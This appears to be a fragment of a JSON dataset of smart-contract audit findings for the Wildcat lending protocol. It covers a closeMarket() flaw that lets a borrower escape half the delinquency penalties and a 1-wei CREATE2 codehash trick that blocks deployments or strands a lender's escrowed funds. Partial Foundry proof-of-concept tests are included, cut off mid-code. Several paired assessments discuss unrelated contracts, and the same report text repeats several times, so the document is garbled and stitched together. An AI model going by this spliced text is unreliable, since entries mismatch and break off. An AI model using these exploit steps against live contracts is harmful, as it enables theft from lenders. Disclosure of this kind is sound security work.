            "detail": "\n# Vulnerability details\n\nTo explain this issue, I will need to mention two things: the fee structure of the protocol and how closing a market works. Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.    MarketState memory state = _getUpdatedState();\n144.    state.annualInterestBips = 0;\n145.    state.isClosed = true;\n146.    state.reserveRatioBips = 0;\n147.    if (_withdrawalData.unpaidBatches.length() > 0) {\n148.      revert CloseMarketWithUnpaidWithdrawals();\n149.    }\n150.    uint256 currentlyHeld = totalAssets();\n151.@>  uint256 totalDebts = state.totalDebts(); //@audit-issue Current debt is calculated with the current scaleFactor. It doesn't check if there are remaining \"state.timeDelinquent\" to pay penalty fees. \n152.    if (currentlyHeld < totalDebts) {\n153.      // Transfer remaining debts from borrower\n154.@>    asset.safeTransferFrom(borrower, address(this), totalDebts - currentlyHeld); //@audit remaining debt is transferred and market is closed, but if the market was delinquent for a while, debt will keep increasing. Total assets will not cover the total debt\n155.    } else if (currentlyHeld > totalDebts) {\n156.      // Transfer excess assets to borrower\n157.      asset.safeTransfer(borrower, currentlyHeld - totalDebts);\n158.    }\n159.    _writeState(state);\n160.    emit MarketClosed(block.timestamp);\n161.  }\n```\n\n\n\nWhile closing the market, the total debt is calculated and the required amount is transferred to the market. This way all debts are covered. However, the covered total debt is calculated with the current scale factor. As you can see above, this function does not check if there are still penalties to be paid. It should have checked the `state.timeDelinquent`.\n\nIf the `state.timeDelinquent > grace period` when closing the market *(which means the borrower still has more penalties to pay)*, the scale factor will keep increasing after every state update.\n\nThe borrower didn't pay the remaining penalties when closing the market, but who will pay it?\n\n* Lenders will keep earning those penalty fees (*the base rate will be 0 after closing, but the penalty fee will still accumulate*)\n    \n* Lenders will start withdrawing their funds.\n    \n* All lenders except the last one will withdraw `the exact debt to the lender when closed + the penalty fee after closing`.\n    \n* The last lender will not even be able to withdraw `the exact debt to the lender when closed` because some portion of the funds dedicated to the last lender are already transferred to the previous lenders as the penalty fee.\n    \n\nThe borrower might intentionally do it to escape from the penalty, or the borrower may not even be aware of the situation.\n\n1. The borrower had a cash flow problem after taking the debt\n    \n2. The market stayed delinquent for a long time\n    \n3. The borrower found some funds\n    \n4. The borrower wanted to close the high-interest debts right after finding some funds\n    \n5. Immediately paid everything and closed the market while the market was still delinquent.\n    \n6. From the borrower's perspective, they paid all of their debt while closing the market.\n\n7. But in reality, the borrower only paid the half of the penalty fee (while the counter was counting up). But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower. \n    \nThe protocol does not check if there are remaining penalties, and doesn't charge the borrower enough while closing the market.\n \nI provided a coded PoC below that shows every step of the vulnerability.\n\n## Impact\n- The borrower will pay only half of the penalty while closing the market. \n- The other half of the penalty will keep accumulating.\n- One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.\n\nBorrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (They know they won't pay the half of it). \nOr the borrowers may not be aware of this, but the protocol doesn't take the required penalty from them. They \"unintentionally\" not pay the penalty, but the lender will have to cover it. \n\n## Proof of Concept\n### Coded PoC\n\nYou can use the protocol's own test setup to prove this issue.  \n\\- Copy the snippet below, and paste it into the `WildcatMarket.t.sol` test file.  \n\\- Run it with `forge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv`\n\n```solidity\n// @audit Not pay the half, leave it to the last lender\n  function test_closeMarket_withoutPaying_HalfofThePenalty() external {\n    // -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------\n    // ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------\n\n    // Alice and Bob deposit 50k each, borrower borrows 80% \n    _authorizeLender(bob);\n    vm.prank(alice);\n    market.depositUpTo(50_000e18);\n    vm.prank(bob);\n    market.depositUpTo(50_000e18);\n    vm.prank(borrower);\n    market.borrow(80_000e18);\n    \n    // Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.\n    vm.prank(alice);\n    market.queueWithdrawal(10_000e18);\n    vm.prank(bob);\n    market.queueWithdrawal(10_000e18);\n    // skip withdrawal batch duration\n    skip(1 days);\n    market.executeWithdrawal(alice, 86401); //86401 is the batch expiry.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext"

                    "description": "The vulnerability stems from the fact that the `close` function in the `LineOfCredit` contract does not verify if a credit entry associated with the given `id` actually exists before attempting to close it. This allows for the possibility of decrementing the `count` variable even when no valid credit entry is being closed.\n\nIn Solidity, when you access a mapping with a key that has no associated value, it will return a default value for the struct, with all fields initialized to their default values (e.g., zero for integers, false for booleans, and the zero address for addresses). In this case, because there's no validation check for the existence of the `id` in the mapping, there's nothing to prevent an actor from passing an arbitrary, non-existing `id` to the `close` function.\n\nAs a result of this oversight, the following unintended behaviors could occur:\n\n1. The count of open credits (`count`) is decremented even though no legitimate credit has been closed. This can lead to underflow issues if the `count` becomes negative, or simply an incorrect representation of the number of active credits.\n  \n2. The `_updateStatus` function may be incorrectly called, leading to a false declaration that the entire Line of Credit facility has been 'repaid', which can cause further inconsistent state and potentially block legitimate operations.\n\n3. Lenders will not receive their funds back since the logic does not enforce the repayment of the principal before closure and does not check the existence of the loan.\n\nThe recommendation to check if a credit with the user-supplied ID exists before any operations are performed is correct. This could be implemented by adding a check in the `close` function to ensure that the `credit` struct retrieved from the `credits` mapping has meaningful data, indicating that it corresponds to an existing credit entry. For example, this could be a check that the lender's address in the credit struct is not the zero address.\n\nConcerning the `closeMarket` function that has been provided, while it includes several checks such as verifying the controller is the caller and checking for unpaid withdrawals, this function is not directly related to the vulnerability described above. The `closeMarket` function deals with the closure of the entire market, while the vulnerability is relevant to the closing of individual credit lines. However, if the `closeMarket` function interacts with the same `credits` mapping or count, then the impact of the `close` function vulnerability could potentially affect the behavior of `closeMarket`. \n\nThe information needed to fully assess this would require knowledge of how these two functions interact and the broader contract's state management logic. Nonetheless, the vulnerability report's content does not directly address issues within the `closeMarket` function.",

            "detail": "\n# Vulnerability details\n\nTo explain this issue, I will need to mention two things: the fee structure of the protocol and how closing a market works. Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.    MarketState memory state = _getUpdatedState();\n144.    state.annualInterestBips = 0;\n145.    state.isClosed = true;\n146.    state.reserveRatioBips = 0;\n147.    if (_withdrawalData.unpaidBatches.length() > 0) {\n148.      revert CloseMarketWithUnpaidWithdrawals();\n149.    }\n150.    uint256 currentlyHeld = totalAssets();\n151.@>  uint256 totalDebts = state.totalDebts(); //@audit-issue Current debt is calculated with the current scaleFactor. It doesn't check if there are remaining \"state.timeDelinquent\" to pay penalty fees. \n152.    if (currentlyHeld < totalDebts) {\n153.      // Transfer remaining debts from borrower\n154.@>    asset.safeTransferFrom(borrower, address(this), totalDebts - currentlyHeld); //@audit remaining debt is transferred and market is closed, but if the market was delinquent for a while, debt will keep increasing. Total assets will not cover the total debt\n155.    } else if (currentlyHeld > totalDebts) {\n156.      // Transfer excess assets to borrower\n157.      asset.safeTransfer(borrower, currentlyHeld - totalDebts);\n158.    }\n159.    _writeState(state);\n160.    emit MarketClosed(block.timestamp);\n161.  }\n```\n\n\n\nWhile closing the market, the total debt is calculated and the required amount is transferred to the market. This way all debts are covered. However, the covered total debt is calculated with the current scale factor. As you can see above, this function does not check if there are still penalties to be paid. It should have checked the `state.timeDelinquent`.\n\nIf the `state.timeDelinquent > grace period` when closing the market *(which means the borrower still has more penalties to pay)*, the scale factor will keep increasing after every state update.\n\nThe borrower didn't pay the remaining penalties when closing the market, but who will pay it?\n\n* Lenders will keep earning those penalty fees (*the base rate will be 0 after closing, but the penalty fee will still accumulate*)\n    \n* Lenders will start withdrawing their funds.\n    \n* All lenders except the last one will withdraw `the exact debt to the lender when closed + the penalty fee after closing`.\n    \n* The last lender will not even be able to withdraw `the exact debt to the lender when closed` because some portion of the funds dedicated to the last lender are already transferred to the previous lenders as the penalty fee.\n    \n\nThe borrower might intentionally do it to escape from the penalty, or the borrower may not even be aware of the situation.\n\n1. The borrower had a cash flow problem after taking the debt\n    \n2. The market stayed delinquent for a long time\n    \n3. The borrower found some funds\n    \n4. The borrower wanted to close the high-interest debts right after finding some funds\n    \n5. Immediately paid everything and closed the market while the market was still delinquent.\n    \n6. From the borrower's perspective, they paid all of their debt while closing the market.\n\n7. But in reality, the borrower only paid the half of the penalty fee (while the counter was counting up). But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower. \n    \nThe protocol does not check if there are remaining penalties, and doesn't charge the borrower enough while closing the market.\n \nI provided a coded PoC below that shows every step of the vulnerability.\n\n## Impact\n- The borrower will pay only half of the penalty while closing the market. \n- The other half of the penalty will keep accumulating.\n- One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.\n\nBorrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (They know they won't pay the half of it). \nOr the borrowers may not be aware of this, but the protocol doesn't take the required penalty from them. They \"unintentionally\" not pay the penalty, but the lender will have to cover it. \n\n## Proof of Concept\n### Coded PoC\n\nYou can use the protocol's own test setup to prove this issue.  \n\\- Copy the snippet below, and paste it into the `WildcatMarket.t.sol` test file.  \n\\- Run it with `forge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv`\n\n```solidity\n// @audit Not pay the half, leave it to the last lender\n  function test_closeMarket_withoutPaying_HalfofThePenalty() external {\n    // -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------\n    // ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------\n\n    // Alice and Bob deposit 50k each, borrower borrows 80% \n    _authorizeLender(bob);\n    vm.prank(alice);\n    market.depositUpTo(50_000e18);\n    vm.prank(bob);\n    market.depositUpTo(50_000e18);\n    vm.prank(borrower);\n    market.borrow(80_000e18);\n    \n    // Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.\n    vm.prank(alice);\n    market.queueWithdrawal(10_000e18);\n    vm.prank(bob);\n    market.queueWithdrawal(10_000e18);\n    // skip withdrawal batch duration\n    skip(1 days);\n    market.executeWithdrawal(alice, 86401); //86401 is the batch expiry.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext"

            "detail": "\n# Vulnerability details\n\nTo explain this issue, I will need to mention two things: the fee structure of the protocol and how closing a market works. Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.    MarketState memory state = _getUpdatedState();\n144.    state.annualInterestBips = 0;\n145.    state.isClosed = true;\n146.    state.reserveRatioBips = 0;\n147.    if (_withdrawalData.unpaidBatches.length() > 0) {\n148.      revert CloseMarketWithUnpaidWithdrawals();\n149.    }\n150.    uint256 currentlyHeld = totalAssets();\n151.@>  uint256 totalDebts = state.totalDebts(); //@audit-issue Current debt is calculated with the current scaleFactor. It doesn't check if there are remaining \"state.timeDelinquent\" to pay penalty fees. \n152.    if (currentlyHeld < totalDebts) {\n153.      // Transfer remaining debts from borrower\n154.@>    asset.safeTransferFrom(borrower, address(this), totalDebts - currentlyHeld); //@audit remaining debt is transferred and market is closed, but if the market was delinquent for a while, debt will keep increasing. Total assets will not cover the total debt\n155.    } else if (currentlyHeld > totalDebts) {\n156.      // Transfer excess assets to borrower\n157.      asset.safeTransfer(borrower, currentlyHeld - totalDebts);\n158.    }\n159.    _writeState(state);\n160.    emit MarketClosed(block.timestamp);\n161.  }\n```\n\n\n\nWhile closing the market, the total debt is calculated and the required amount is transferred to the market. This way all debts are covered. However, the covered total debt is calculated with the current scale factor. As you can see above, this function does not check if there are still penalties to be paid. It should have checked the `state.timeDelinquent`.\n\nIf the `state.timeDelinquent > grace period` when closing the market *(which means the borrower still has more penalties to pay)*, the scale factor will keep increasing after every state update.\n\nThe borrower didn't pay the remaining penalties when closing the market, but who will pay it?\n\n* Lenders will keep earning those penalty fees (*the base rate will be 0 after closing, but the penalty fee will still accumulate*)\n    \n* Lenders will start withdrawing their funds.\n    \n* All lenders except the last one will withdraw `the exact debt to the lender when closed + the penalty fee after closing`.\n    \n* The last lender will not even be able to withdraw `the exact debt to the lender when closed` because some portion of the funds dedicated to the last lender are already transferred to the previous lenders as the penalty fee.\n    \n\nThe borrower might intentionally do it to escape from the penalty, or the borrower may not even be aware of the situation.\n\n1. The borrower had a cash flow problem after taking the debt\n    \n2. The market stayed delinquent for a long time\n    \n3. The borrower found some funds\n    \n4. The borrower wanted to close the high-interest debts right after finding some funds\n    \n5. Immediately paid everything and closed the market while the market was still delinquent.\n    \n6. From the borrower's perspective, they paid all of their debt while closing the market.\n\n7. But in reality, the borrower only paid the half of the penalty fee (while the counter was counting up). But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower. \n    \nThe protocol does not check if there are remaining penalties, and doesn't charge the borrower enough while closing the market.\n \nI provided a coded PoC below that shows every step of the vulnerability.\n\n## Impact\n- The borrower will pay only half of the penalty while closing the market. \n- The other half of the penalty will keep accumulating.\n- One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.\n\nBorrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (They know they won't pay the half of it). \nOr the borrowers may not be aware of this, but the protocol doesn't take the required penalty from them. They \"unintentionally\" not pay the penalty, but the lender will have to cover it. \n\n## Proof of Concept\n### Coded PoC\n\nYou can use the protocol's own test setup to prove this issue.  \n\\- Copy the snippet below, and paste it into the `WildcatMarket.t.sol` test file.  \n\\- Run it with `forge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv`\n\n```solidity\n// @audit Not pay the half, leave it to the last lender\n  function test_closeMarket_withoutPaying_HalfofThePenalty() external {\n    // -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------\n    // ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------\n\n    // Alice and Bob deposit 50k each, borrower borrows 80% \n    _authorizeLender(bob);\n    vm.prank(alice);\n    market.depositUpTo(50_000e18);\n    vm.prank(bob);\n    market.depositUpTo(50_000e18);\n    vm.prank(borrower);\n    market.borrow(80_000e18);\n    \n    // Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.\n    vm.prank(alice);\n    market.queueWithdrawal(10_000e18);\n    vm.prank(bob);\n    market.queueWithdrawal(10_000e18);\n    // skip withdrawal batch duration\n    skip(1 days);\n    market.executeWithdrawal(alice, 86401); //86401 is the batch expiry.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext"

            "detail": "\n# Vulnerability details\n\n## Bug Description\n\nIn `WildcatMarketControllerFactory.sol`, registered borrowers can call `deployController()` to deploy a `WildcatMarketController` contract for themselves.\n\nThe function checks if the `codehash` of the controller address is `bytes32(0)` to determine if the controller has already been deployed:\n\n\n\n```solidity\n    // Salt is borrower address\n    bytes32 salt = bytes32(uint256(uint160(msg.sender)));\n    controller = LibStoredInitCode.calculateCreate2Address(\n      ownCreate2Prefix,\n      salt,\n      controllerInitCodeHash\n    );\n    if (controller.codehash != bytes32(0)) { // auditor: This check\n      revert ControllerAlreadyDeployed();\n    }\n```\n\nThis same check is also used in `deployMarket()`, which is called by borrowers to deploy markets:\n\n\n\n```solidity\n    bytes32 salt = _deriveSalt(asset, namePrefix, symbolPrefix);\n    market = LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix, salt, marketInitCodeHash);\n    if (market.codehash != bytes32(0)) {\n      revert MarketAlreadyDeployed();\n    }\n```\n\nThis check also exists in `createEscrow()`, which is called by markets to deploy an escrow contract whenever a sanctioned lender gets blocked:\n\n\n\n```solidity\n    escrowContract = getEscrowAddress(borrower, account, asset);\n\n    if (escrowContract.codehash != bytes32(0)) return escrowContract;\n```\n\nHowever, this `<address>.codehash != bytes32(0)` check is insufficient to determine if an address has existing code.\n\nAccording to , addresses without code only return a `0x0` codehash when they are **empty**:\n> In case the account does not exist or is empty (as defined by  `0` is pushed to the stack.\n>\n> In case the account does not have code the keccak256 hash of empty data (i.e. `c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470`) is pushed to the stack.\n\nAs seen from above, addresses without code can also return `keccak256(\"\")` as its codehash if it is non-empty.  states that an address must have a zero ETH balance for it to be empty:\n\n> An account is considered *empty* when it has **no code** and **zero nonce** and **zero balance**.\n\nAs such, if anyone transfers 1 wei to an address, `.codehash` will return `keccak256(\"\")` instead of `bytes32(0)`, making the checks shown above pass incorrectly.\n\nSince all contract deployments in the protocol use `CREATE2`, a malicious attacker can harm users by doing the following:\n- For controller deployments:\n  - Attacker calls  to compute the controller address for a borrower.\n  - Attacker transfers 1 wei to it, causing `.codehash` to become non-zero.\n  - When `deployController()` is called by the borrower, the check passes, causing the function to revert.\n- For market deployments:\n  - Attacker calls  with arguments such that the deployment salt is the same. \n  - Attacker transfers 1 wei to the resulting market address, causing `.codehash` to become non-zero.\n  - When `deployMarket()` is called by the borrower, the function reverts.\n- For escrow deployments:\n  - Attacker calls  with the `borrower`, sanctioned `lender` and market/asset address to compute the resulting escrow address.\n  - Attacker transfers 1 wei to the escrow address, causing `.codehash` to become non-zero.\n  - When either  or  is called, `createEscrow()` simply returns the escrow address instead of deploying an escrow contract.\n  - The market tokens and/or funds of the lender are transferred to the escrow address, causing them to be unrecoverable since the escrow contract was never deployed.\n\nNote that for controller deployments, since the salt is fixed to the `borrower` address and cannot be varied, the DOS for `deployController()` is permanent. This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

Moreover, if the '_resetTmpEscrowParams' function fails to reset global state correctly or if it invokes external calls, it could further compound the issue.

However, because `_references[4]` is provided during market creation, a malicious creator can provide an address for which the vault (`Vault.sol`) has an unlimited approval, potentially enabling the malicious user to deposit more funds into the vault than intended by the market creator or even from addresses that do not wish to participate.\n\nIn this scenario, a market creator with bad intentions can manipulate the system to have tokens incorrectly transferred from the approved reference address, potentially leading to loss of funds for honest market participants. The vulnerability assumes that the provided approved reference has indeed set the unlimited approval amount for the Vault, which would be needed for the exploit to work.\n\nThe recommended mitigation steps make sense as they modify the flow to ensure that the market creator (`_creator` which is set to `msg.sender`) is used as the depositor in the Pool Template, ensuring that the deposit action represents an intentional and authorized move by the creator of the market.\n\nThe given `createEscrow` function is not directly related to the reported vulnerability, which appears to be more about the interaction between `Factory.createMarket` and `PoolTemplate.initialize`.

            "detail": "\n# Vulnerability details\n\n## Bug Description\n\nIn `WildcatMarketControllerFactory.sol`, registered borrowers can call `deployController()` to deploy a `WildcatMarketController` contract for themselves.\n\nThe function checks if the `codehash` of the controller address is `bytes32(0)` to determine if the controller has already been deployed:\n\n\n\n```solidity\n    // Salt is borrower address\n    bytes32 salt = bytes32(uint256(uint160(msg.sender)));\n    controller = LibStoredInitCode.calculateCreate2Address(\n      ownCreate2Prefix,\n      salt,\n      controllerInitCodeHash\n    );\n    if (controller.codehash != bytes32(0)) { // auditor: This check\n      revert ControllerAlreadyDeployed();\n    }\n```\n\nThis same check is also used in `deployMarket()`, which is called by borrowers to deploy markets:\n\n\n\n```solidity\n    bytes32 salt = _deriveSalt(asset, namePrefix, symbolPrefix);\n    market = LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix, salt, marketInitCodeHash);\n    if (market.codehash != bytes32(0)) {\n      revert MarketAlreadyDeployed();\n    }\n```\n\nThis check also exists in `createEscrow()`, which is called by markets to deploy an escrow contract whenever a sanctioned lender gets blocked:\n\n\n\n```solidity\n    escrowContract = getEscrowAddress(borrower, account, asset);\n\n    if (escrowContract.codehash != bytes32(0)) return escrowContract;\n```\n\nHowever, this `<address>.codehash != bytes32(0)` check is insufficient to determine if an address has existing code.\n\nAccording to , addresses without code only return a `0x0` codehash when they are **empty**:\n> In case the account does not exist or is empty (as defined by  `0` is pushed to the stack.\n>\n> In case the account does not have code the keccak256 hash of empty data (i.e. `c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470`) is pushed to the stack.\n\nAs seen from above, addresses without code can also return `keccak256(\"\")` as its codehash if it is non-empty.  states that an address must have a zero ETH balance for it to be empty:\n\n> An account is considered *empty* when it has **no code** and **zero nonce** and **zero balance**.\n\nAs such, if anyone transfers 1 wei to an address, `.codehash` will return `keccak256(\"\")` instead of `bytes32(0)`, making the checks shown above pass incorrectly.\n\nSince all contract deployments in the protocol use `CREATE2`, a malicious attacker can harm users by doing the following:\n- For controller deployments:\n  - Attacker calls  to compute the controller address for a borrower.\n  - Attacker transfers 1 wei to it, causing `.codehash` to become non-zero.\n  - When `deployController()` is called by the borrower, the check passes, causing the function to revert.\n- For market deployments:\n  - Attacker calls  with arguments such that the deployment salt is the same. \n  - Attacker transfers 1 wei to the resulting market address, causing `.codehash` to become non-zero.\n  - When `deployMarket()` is called by the borrower, the function reverts.\n- For escrow deployments:\n  - Attacker calls  with the `borrower`, sanctioned `lender` and market/asset address to compute the resulting escrow address.\n  - Attacker transfers 1 wei to the escrow address, causing `.codehash` to become non-zero.\n  - When either  or  is called, `createEscrow()` simply returns the escrow address instead of deploying an escrow contract.\n  - The market tokens and/or funds of the lender are transferred to the escrow address, causing them to be unrecoverable since the escrow contract was never deployed.\n\nNote that for controller deployments, since the salt is fixed to the `borrower` address and cannot be varied, the DOS for `deployController()` is permanent. This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

            "detail": "\n# Vulnerability details\n\n## Bug Description\n\nIn `WildcatMarketControllerFactory.sol`, registered borrowers can call `deployController()` to deploy a `WildcatMarketController` contract for themselves.\n\nThe function checks if the `codehash` of the controller address is `bytes32(0)` to determine if the controller has already been deployed:\n\n\n\n```solidity\n    // Salt is borrower address\n    bytes32 salt = bytes32(uint256(uint160(msg.sender)));\n    controller = LibStoredInitCode.calculateCreate2Address(\n      ownCreate2Prefix,\n      salt,\n      controllerInitCodeHash\n    );\n    if (controller.codehash != bytes32(0)) { // auditor: This check\n      revert ControllerAlreadyDeployed();\n    }\n```\n\nThis same check is also used in `deployMarket()`, which is called by borrowers to deploy markets:\n\n\n\n```solidity\n    bytes32 salt = _deriveSalt(asset, namePrefix, symbolPrefix);\n    market = LibStoredInitCode.calculateCreate2Address(ownCreate2Prefix, salt, marketInitCodeHash);\n    if (market.codehash != bytes32(0)) {\n      revert MarketAlreadyDeployed();\n    }\n```\n\nThis check also exists in `createEscrow()`, which is called by markets to deploy an escrow contract whenever a sanctioned lender gets blocked:\n\n\n\n```solidity\n    escrowContract = getEscrowAddress(borrower, account, asset);\n\n    if (escrowContract.codehash != bytes32(0)) return escrowContract;\n```\n\nHowever, this `<address>.codehash != bytes32(0)` check is insufficient to determine if an address has existing code.\n\nAccording to , addresses without code only return a `0x0` codehash when they are **empty**:\n> In case the account does not exist or is empty (as defined by  `0` is pushed to the stack.\n>\n> In case the account does not have code the keccak256 hash of empty data (i.e. `c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470`) is pushed to the stack.\n\nAs seen from above, addresses without code can also return `keccak256(\"\")` as its codehash if it is non-empty.  states that an address must have a zero ETH balance for it to be empty:\n\n> An account is considered *empty* when it has **no code** and **zero nonce** and **zero balance**.\n\nAs such, if anyone transfers 1 wei to an address, `.codehash` will return 